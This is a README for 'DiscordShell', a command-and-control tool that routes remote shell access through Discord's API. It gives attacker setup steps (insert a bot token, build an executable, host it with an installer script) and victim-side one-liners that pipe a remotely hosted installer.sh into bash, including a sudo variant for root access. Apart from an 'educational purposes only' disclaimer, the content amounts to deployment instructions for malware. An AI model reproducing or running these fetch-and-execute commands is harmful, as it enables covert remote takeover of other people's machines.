# DiscordShell

C2 hosted on Discord via use of the Discord Python API. Created by [Sid Lacy](https://github.com/lacysw) and [Nathan Burns](https://github.com/AlbinoGazelle).

The files contained in this repository are intended for educational purposes only. Malicious use of code hosted within this repository is not permitted.

## Hosting instructions

### Attacker

1. Edit `shell.py` to contain the following valid strings: `apitoken1`, `server`, `debug`.
2. Run `build.sh` to yield an executable.
3. Host the executable (`shell`) and `installer.sh` on `$scrip:$scrport`.

### Victim

 - Execute `curl -s  http://$srcip:$srcport/installer.sh | bash` for a standard connection.
 - Execute `curl -s  http://$srcip:$srcport/installer.sh | sudo bash` for a root connection.

